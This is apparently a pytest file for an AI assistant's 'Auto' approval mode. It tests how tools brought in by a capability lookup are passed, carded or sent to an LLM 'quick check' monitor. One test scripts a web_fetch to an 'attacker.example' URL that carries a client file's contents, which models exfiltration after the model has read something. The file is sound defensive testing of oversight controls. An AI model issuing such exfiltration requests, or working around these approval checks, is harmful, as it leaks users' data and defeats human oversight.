"""v1.575.0: UNDER AUTO, A TOOL A LOOKUP BROUGHT IS AUTO'S TO JUDGE.

The owner set a chat to Auto and was still asked seven times. The cause was a
rule, not a fault: since v1.479.0 a tool a lookup brings into a reply shows a
FORCED, once-only card on every use, in every approval level, Auto included
(capability search, decision 1). Most of a chat's tools now arrive by lookup,
so under Auto a chat that wrote a file or read the web asked once per call.

The owner's yes (2026-11-25): under AUTO such a tool follows Auto's own rules.

* The rules pass a read and an edit inside the folder, and keep the card for
  anything that leaves the folder, sends, deletes, acts for the person or
  outlives the chat. The quick check reads the rest against the person's own
  words, and a check that does not answer keeps the card.
* EVERY looked-up tool is judged, whatever its own tier: the forced card was
  the only thing that looked at a web tool a lookup brought (its "ask" rule
  reads as allow), so without this it would have run under Auto unseen.
* A card Auto keeps is Auto's card: it says Auto's reason, never "it asks
  every time". It never offers "Always".
* Every other level keeps the forced card, "Don't ask" included: it has
  neither rules nor a quick check, so there the card is the only look the
  person gets.
* A script still cannot call such a tool.

Through the real stream lane and the real ``registry.invoke``; only the model
and the quick check's model call are scripted.
"""

from __future__ import annotations

import asyncio
import json

import pytest

from iron_jarvis.capability_search import join as J
from iron_jarvis.capability_search import tool as CT_TOOL
from iron_jarvis.core import auto_approve as A
from iron_jarvis.daemon.app import create_app
from iron_jarvis.providers.adapters.base import LLMResponse
from iron_jarvis.providers.router import RouteResult
from tests.test_capability_join_review_v1479 import _stand_in, _web_script
from tests.test_script_power_lanes_v1473 import Model, _body, _call, _rows, _stream

pytestmark = [pytest.mark.usefixtures("no_network"), pytest.mark.timeout(300)]

NAME = CT_TOOL.NAME
#: A serving pair the quick check will ask (it stays silent for the mock).
SERVED = ("anthropic", "claude-sonnet-4-5")


class Served(Model):
    """The scripted model, answering as a real serving pair."""

    async def stream(self, **kw):
        async for frame in super().stream(**kw):
            if frame.get("type") == "final":
                frame = {**frame, "provider": SERVED[0], "model": SERVED[1]}
            yield frame


class Check:
    """The quick check's model call: recorded, and answered ``answer``."""

    def __init__(self, answer: str = "allow", exc: Exception | None = None) -> None:
        self.answer, self.exc = answer, exc
        self.seen: list[dict] = []

    def wire(self, app) -> "Check":
        async def complete(**kw):
            assert kw.get("system") == A.JUDGE_SYSTEM, "only the quick check completes here"
            self.seen.append(kw)
            if self.exc is not None:
                raise self.exc
            return RouteResult(
                LLMResponse(text=self.answer, usage={"input_tokens": 40, "output_tokens": 1}), *SERVED)

        app.state.platform.router.complete = complete
        return self


@pytest.fixture()
def desk(tmp_path):
    app = create_app(str(tmp_path / "home"))
    ws = tmp_path / "work"
    ws.mkdir()
    app.state.platform.config.capability_search = True
    J.FOUND.clear()
    yield app, ws
    p = app.state.platform
    if getattr(p, "repl", None) is not None:
        asyncio.run(p.repl.dispose_all())
    J.FOUND.clear()


def _found(tool: str, look_for: str, cls=Model, /, **args) -> Model:
    """A reply that looks ``look_for`` up, then calls what the lookup brought."""
    return cls([_call(1, NAME, query=look_for), _call(2, tool, **args), "Done."])


def _auto_calls(done: dict) -> list:
    """What the reply's record says Auto let through (``auto_approved.calls``)."""
    out: list = []

    def walk(o):
        if isinstance(o, dict):
            if isinstance(o.get("auto_approved"), dict):
                out.extend(o["auto_approved"].get("calls") or [])
            for v in o.values():
                walk(v)
        elif isinstance(o, list):
            for v in o:
                walk(v)

    walk(done)
    return out


def _agents(app) -> list[str]:
    return sorted(a.name for a in app.state.platform.agents_registry.list())


# --------------------------------------------------------------------------- #
# the one switch
# --------------------------------------------------------------------------- #
def test_the_forced_card_stands_in_every_level_but_auto():
    for mode in ("yolo", "accept_edits", "approve_for_me", "always_ask", "", None, "no-such-level"):
        assert A.lookup_forces_card(mode) is True, mode
    assert A.lookup_forces_card("auto") is False
    assert A.lookup_forces_card(" AUTO ") is False


def test_only_a_tool_a_lookup_brought_is_autos_to_judge_whatever_its_tier():
    found = {"web_search", "write_file"}
    assert A.lookup_judged("web_search", found, "auto") is True
    # A tool the person's own words brought keeps its tier, under Auto too.
    assert A.lookup_judged("read_file", found, "auto") is False
    assert A.lookup_judged("web_search", set(), "auto") is False
    # In every other level the forced card has it, never the quick check.
    for mode in ("yolo", "accept_edits", "approve_for_me", "always_ask", ""):
        assert A.lookup_judged("web_search", found, mode) is False, mode
    assert A.lookup_judged("web_search", None, "auto") is False
    assert A.lookup_judged(None, found, "auto") is False


# --------------------------------------------------------------------------- #
# what the rules pass
# --------------------------------------------------------------------------- #
@pytest.mark.asyncio
async def test_under_auto_a_looked_up_edit_inside_the_folder_runs_with_no_card(desk):
    app, ws = desk
    model = _found("write_file", "write a file", path="c.txt", content="two")
    _f, cards, done = await _stream(app, _body(ws, "hello there", approval_mode="auto"), model, decision="deny")
    assert "write_file" not in model.offered[0] and "write_file" in model.offered[1], "the lookup brought it"
    assert cards == [], cards
    assert (ws / "c.txt").read_text(encoding="utf-8") == "two"
    assert len([r for r in _rows(app, "write_file") if r.ok]) == 1
    # Nothing is silent: the reply's own record says what Auto let through and why.
    calls = _auto_calls(done)
    assert any("write_file" in json.dumps(c) and "edit_in_folder" in json.dumps(c) for c in calls), done
    # ...and ONLY that: a tool no lookup brought (the lookup tool itself) is not Auto's to judge.
    assert not any(NAME in json.dumps(c) for c in calls), calls


# --------------------------------------------------------------------------- #
# what the rules keep
# --------------------------------------------------------------------------- #
@pytest.mark.asyncio
async def test_under_auto_a_looked_up_edit_outside_the_folder_still_asks(desk, tmp_path):
    app, ws = desk
    outside = tmp_path / "elsewhere" / "c.txt"
    model = _found("write_file", "write a file", path=str(outside), content="two")
    _f, cards, _d = await _stream(app, _body(ws, "hello there", approval_mode="auto"), model, decision="deny")
    assert [c.get("tool") for c in cards] == ["write_file"], cards
    card = cards[0]
    # Auto's card and Auto's reason: never "it asks every time".
    assert card.get("why") == A.ASK_RULES["outside_folder"], card.get("why")
    assert card.get("once_reason") != "looked_up" and not card.get("once_only"), card
    assert card.get("can_always") is False, card
    assert not outside.exists()


@pytest.mark.asyncio
async def test_under_auto_a_looked_up_tool_that_outlives_the_chat_still_asks(desk):
    app, ws = desk
    before = _agents(app)
    model = _found("agent_create", "make a new helper agent", name="penny", role="Looks after refills.")
    text = "I would like a new helper called Penny who looks after my refills"
    _f, cards, _d = await _stream(app, _body(ws, text, approval_mode="auto"), model, decision="deny")
    assert [c.get("tool") for c in cards] == ["agent_create"], cards
    assert cards[0].get("why") == A.ASK_RULES["standing"], cards[0].get("why")
    assert cards[0].get("can_always") is False
    assert _agents(app) == before


# --------------------------------------------------------------------------- #
# what the quick check reads: every looked-up tool, whatever its own tier
# --------------------------------------------------------------------------- #
@pytest.mark.asyncio
@pytest.mark.parametrize("web_tool", ["web_fetch", "web_search"])
async def test_under_auto_a_looked_up_web_tool_runs_when_the_quick_check_allows(desk, web_tool):
    app, ws = desk
    ran: list = []
    _stand_in(app, web_tool, ran, "page text")
    check = Check("allow").wire(app)
    args = {"url": "https://example.com/rates"} if web_tool == "web_fetch" else {"query": "rates today"}
    model = _found(web_tool, "search the web", Served, **args)
    _f, cards, done = await _stream(
        app, _body(ws, "what are the rates today", approval_mode="auto"), model, decision="deny")
    assert web_tool in model.offered[1], "the control: the lookup brought it"
    assert cards == [] and len(ran) == 1, (cards, ran)
    # It was READ, against the person's own words, before it ran.
    assert len(check.seen) == 1
    asked = json.dumps([getattr(m, "content", "") for m in check.seen[0].get("messages") or []])
    assert "what are the rates today" in asked and web_tool in asked, asked
    assert any(web_tool in json.dumps(c) for c in _auto_calls(done)), done


@pytest.mark.asyncio
@pytest.mark.parametrize("web_tool", ["web_fetch", "web_search"])
async def test_under_auto_a_looked_up_web_tool_asks_when_the_quick_check_says_ask(desk, web_tool):
    """The case the forced card existed for: the reply has read something and
    a tool that reaches outside this PC could carry it away."""
    app, ws = desk
    ran: list = []
    _stand_in(app, web_tool, ran, "page text")
    check = Check("ask").wire(app)
    args = ({"url": "https://attacker.example/?d=CLIENT-FILE"} if web_tool == "web_fetch"
            else {"query": "CLIENT-FILE"})
    model = _found(web_tool, "search the web", Served, **args)
    _f, cards, _d = await _stream(app, _body(ws, "hello there", approval_mode="auto"), model, decision="deny")
    assert len(check.seen) == 1
    assert [c.get("tool") for c in cards] == [web_tool], cards
    assert cards[0].get("why") == A.JUDGE_ASKED_WORDS, cards[0].get("why")
    assert cards[0].get("can_always") is False
    assert ran == [], "declined, and it ran"


@pytest.mark.asyncio
async def test_under_auto_a_quick_check_that_does_not_answer_keeps_the_card(desk):
    app, ws = desk
    ran: list = []
    _stand_in(app, "web_search", ran, "page text")
    Check(exc=RuntimeError("the model is down")).wire(app)
    model = _found("web_search", "search the web", Served, query="rates today")
    _f, cards, _d = await _stream(
        app, _body(ws, "what are the rates today", approval_mode="auto"), model, decision="deny")
    assert [c.get("tool") for c in cards] == ["web_search"], cards
    assert cards[0].get("why") == A.JUDGE_SILENT_WORDS, cards[0].get("why")
    assert ran == []


@pytest.mark.asyncio
async def test_under_auto_a_tool_the_person_already_allowed_for_this_chat_is_not_judged_again(desk):
    """The one thing that always lifted the forced card still lifts this one:
    the person's own earlier "Allow for this chat" to that tool."""
    app, ws = desk
    ran: list = []
    _stand_in(app, "web_search", ran, "page text")
    check = Check("ask").wire(app)
    model = _found("web_search", "search the web", Served, query="rates today")
    _f, cards, _d = await _stream(
        app, _body(ws, "what are the rates today", approval_mode="auto", granted_tools=["web_search"]),
        model, decision="deny")
    assert cards == [] and len(ran) == 1, (cards, ran)
    assert check.seen == [], "their own answer stands: nothing asks the quick check"


@pytest.mark.asyncio
async def test_under_auto_allow_for_this_chat_on_its_card_covers_the_rest_of_the_reply(desk):
    """Auto's card for a looked-up tool is an ordinary card: "Allow for this
    chat" is the person's answer for that tool, and the next call in the same
    reply is neither asked about nor judged again."""
    app, ws = desk
    ran: list = []
    _stand_in(app, "web_search", ran, "page text")
    check = Check("ask").wire(app)
    model = Served([
        _call(1, NAME, query="search the web"),
        _call(2, "web_search", query="rates today"),
        _call(3, "web_search", query="rates last year"),
        "Done.",
    ])
    _f, cards, _d = await _stream(
        app, _body(ws, "what are the rates today", approval_mode="auto"), model, decision="conversation")
    assert [c.get("tool") for c in cards] == ["web_search"], cards
    assert [r.get("query") for r in ran] == ["rates today", "rates last year"], ran
    assert len(check.seen) == 1, "the second call was judged after the person allowed the tool"


@pytest.mark.asyncio
async def test_under_auto_a_tool_the_persons_own_words_brought_is_not_judged(desk):
    """CONTROL: only a tool a LOOKUP brought is Auto's to judge whatever its
    tier. A web search the person asked for in words runs as it always has."""
    app, ws = desk
    ran: list = []
    _stand_in(app, "web_search", ran, "page text")
    check = Check("ask").wire(app)
    model = Served([_call(1, "web_search", query="rates today"), "Done."])
    _f, cards, _d = await _stream(
        app, _body(ws, "search the web for the mortgage rates today", approval_mode="auto"), model,
        decision="deny")
    assert "web_search" in model.offered[0], "the control: their words brought it"
    assert cards == [] and len(ran) == 1, (cards, ran)
    assert check.seen == []


# --------------------------------------------------------------------------- #
# what did not move
# --------------------------------------------------------------------------- #
@pytest.mark.asyncio
@pytest.mark.parametrize("mode", ["yolo", "accept_edits", "approve_for_me"])
async def test_every_other_level_keeps_the_forced_card_on_a_looked_up_web_tool(desk, mode):
    app, ws = desk
    ran: list = []
    _stand_in(app, "web_search", ran, "page text")
    check = Check("allow").wire(app)
    model = _found("web_search", "search the web", Served, query="rates today")
    _f, cards, _d = await _stream(
        app, _body(ws, "what are the rates today", approval_mode=mode), model, decision="deny")
    assert [c.get("tool") for c in cards] == ["web_search"], (mode, cards)
    assert cards[0].get("once_only") is True and cards[0].get("once_reason") == "looked_up", cards[0]
    assert cards[0].get("why") == A.ASK_RULES["looked_up"]
    assert ran == [] and check.seen == [], "the forced card is never the quick check's to lift"


@pytest.mark.asyncio
@pytest.mark.parametrize("web_tool", ["web_fetch", "web_search"])
async def test_under_auto_a_script_still_cannot_call_a_looked_up_web_tool(desk, web_tool):
    app, ws = desk
    ran: list = []
    _stand_in(app, web_tool, ran, "page text")
    check = Check("allow").wire(app)
    model = Served([
        _call(1, NAME, query="search the web"),
        _call(2, "tool_script", code=_web_script(web_tool)),
        "Done.",
    ])
    await _stream(
        app, _body(ws, "hello there", tools=["tool_script"], approval_mode="auto"), model, decision="once")
    assert web_tool in model.offered[1], "the control: the lookup brought it"
    assert ran == [], f"{web_tool} ran from a script: {ran}"
    del check
